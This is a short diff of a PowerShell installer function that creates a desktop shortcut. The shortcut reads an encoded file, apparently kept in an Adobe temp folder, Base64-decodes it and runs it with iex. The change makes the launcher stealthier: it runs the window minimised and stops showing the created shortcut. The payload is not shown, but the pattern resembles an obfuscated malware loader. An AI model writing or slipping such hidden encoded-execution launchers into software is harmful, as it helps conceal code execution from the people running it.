@@ -159,7 +159,7 @@ function Install-App {
     [string] $DestinationPath = [Environment]::GetFolderPath("Desktop") + "\Keep.lnk"
     # 處理命令
     $Text = "([System.Io.File]::ReadAllText('$FileName', $EncCMD) -replace (`'$reg`', `'$key`'))"
-    $Arguments = "-NoP -NoProfile -C `"[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($Text)) | iex; $Arguments`""
+    $Arguments = "-NoP -Window Mini -C `"[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($Text)) | iex; $Arguments`""
     # 處理捷徑
     $WshShell = New-Object -comObject WScript.Shell
     $Shortcut = $WshShell.CreateShortcut($DestinationPath)
@@ -169,7 +169,7 @@ function Install-App {
     # 通知
     Write-Host "Shortcuts have been created to " -NoNewline
     Write-Host "`"$DestinationPath`"" -ForegroundColor:Yellow
-    explorer.exe $DestinationPath
+    # explorer.exe $DestinationPath
 } # Install-App "C:\ProgramData\Adobe\Temp\keep"
 
 
